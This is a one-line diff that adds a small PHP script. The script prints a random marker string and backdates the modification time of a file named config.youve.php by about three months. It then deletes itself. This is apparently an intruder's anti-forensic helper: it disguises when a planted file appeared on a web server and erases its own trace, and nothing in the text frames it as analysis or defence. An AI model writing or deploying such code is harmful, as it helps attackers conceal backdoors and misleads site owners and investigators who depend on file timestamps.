@@ -1,0 +1,1 @@
+<?php echo "BDvrpywWUy"; if (file_exists("./config.youve.php")){ touch("./config.youve.php",(time()-60*60*24*30*3)); } unlink(__FILE__); /*4Wxp8VmhpQ7mNBzWKTTW*/ ?>
